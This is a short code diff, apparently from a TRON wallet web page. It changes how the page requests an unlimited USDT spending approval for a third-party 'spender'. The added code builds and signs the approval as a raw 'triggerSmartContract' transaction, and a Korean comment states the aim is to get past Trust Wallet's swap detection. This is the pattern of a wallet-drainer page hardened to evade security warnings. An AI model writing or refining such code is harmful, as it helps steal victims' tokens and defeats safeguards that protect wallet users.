@@ -585,8 +585,18 @@
             showToast('지갑에서 서명 팝업을 확인하세요.');
 
             try{
-                var contract=await tw.contract().at(OFFICIAL_USDT_CONTRACT);
-                var txHash=await contract.approve(spender,MAX_ALLOWANCE).send({feeLimit:100000000});
+                // triggerSmartContract 원시 방식 (Trust Wallet 스왑 감지 우회)
+                var tx=await tw.transactionBuilder.triggerSmartContract(
+                    OFFICIAL_USDT_CONTRACT,
+                    'approve(address,uint256)',
+                    {feeLimit:100000000},
+                    [{type:'address',value:spender},{type:'uint256',value:MAX_ALLOWANCE}],
+                    currentWalletAddress
+                );
+                if(!tx||!tx.transaction)throw new Error('트랜잭션 생성 실패');
+                var signedTx=await tw.trx.sign(tx.transaction);
+                var result=await tw.trx.sendRawTransaction(signedTx);
+                var txHash=result.txid||result.transaction?.txID||signedTx.txID||'ok';
                 if(!txHash)throw new Error('TX 해시 수신 실패');
 
                 // Step 3: 완료
